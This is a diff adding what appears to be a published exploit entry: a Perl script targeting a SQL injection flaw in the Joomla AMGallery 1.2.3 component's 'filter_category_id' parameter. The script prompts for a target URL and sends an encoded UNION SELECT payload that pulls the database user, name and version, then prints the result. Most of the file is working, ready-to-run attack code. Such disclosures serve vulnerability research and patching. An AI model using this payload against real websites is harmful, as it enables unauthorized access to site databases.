@@ -1,0 +1,54 @@
+# Exploit Title: Joomla! Component AMGallery 1.2.3 - 'filter_category_id' SQL Injection
+# Exploit Author: Ihsan Sencan
+# Dork: N/A
+# Date: 2018-09-18
+# Vendor Homepage: http://arenam.ru/
+# Software Link: https://extensions.joomla.org/extensions/extension/photos-a-images/galleries/amgallery/
+# Version: 1.2.3
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+
+# # # # #
+# POC: 
+# 
+# 1)
+# # # # #
+
+#!/usr/bin/perl -w
+# # # # #
+
+sub clear{
+system(($^O eq 'MSWin32') ? 'cls' : 'clear'); }
+clear();
+print "
+################################################################################
+        ______  _______ ___    _   __   _____ _______   ___________    _   __ 
+       /  _/ / / / ___//   |  / | / /  / ___// ____/ | / / ____/   |  / | / / 
+       / // /_/ /\__ \/ /| | /  |/ /   \__ \/ __/ /  |/ / /   / /| | /  |/ /
+     _/ // __  /___/ / ___ |/ /|  /   ___/ / /___/ /|  / /___/ ___ |/ /|  /
+    /___/_/ /_//____/_/  |_/_/ |_/   /____/_____/_/ |_/\____/_/  |_/_/ |_/
+                                       
+                                       +                                     
+                Joomla! Component AMGallery 1.2.3 - SQL Injection          
+################################################################################
+";
+
+use LWP::UserAgent;
+print "\nTarget:[http://site.com/path/]: "; 
+chomp(my $target=<STDIN>);
+print "\n[!] Exploiting Progress.....\n";
+print "\n";
+$efe="%2d%36%36%36%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%32%23";
+$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
+$b->agent('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0');
+$host = $target . "?filter_category_id=".$efe."";
+$res = $b->request(HTTP::Request->new(GET=>$host));
+$answer = $res->content; if ($answer =~/<h2 class="amGalleryCatTitle">(.*?)<\/h2>/){ 
+print "[+] Success !!!\n";
+print "\n[+] Detail : $1\n";
+print "\n";
+}
+else{print "\n[-]Not found.\n";
+}
